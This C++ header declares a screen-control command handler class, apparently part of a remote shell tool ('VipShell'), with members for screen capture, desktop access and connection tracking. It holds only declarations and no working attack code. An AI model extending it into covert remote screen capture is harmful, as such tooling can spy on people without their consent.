#pragma once
#include "defcommandproc.h"
#include ".\getscreeninfo.h"
#include ".\opendesktop.h"

//
class CScreenControlProc :
	public CDefCommandProc
{
public:
	CScreenControlProc(void);
	~CScreenControlProc(void);
protected:
	CGetScreenInfo m_hScreen;
	DWORD m_dwConnectId;
	DWORD m_dwStartTime;
	COpenDesktop m_hDesktop;
	
protected:
	virtual void OnCmd_GetDoWork(tagVipShellCmd* info);
	virtual void OnCmd_GetScreen(tagVipShellCmd* info);

public:
	void SetConnectId(DWORD dwId);
};
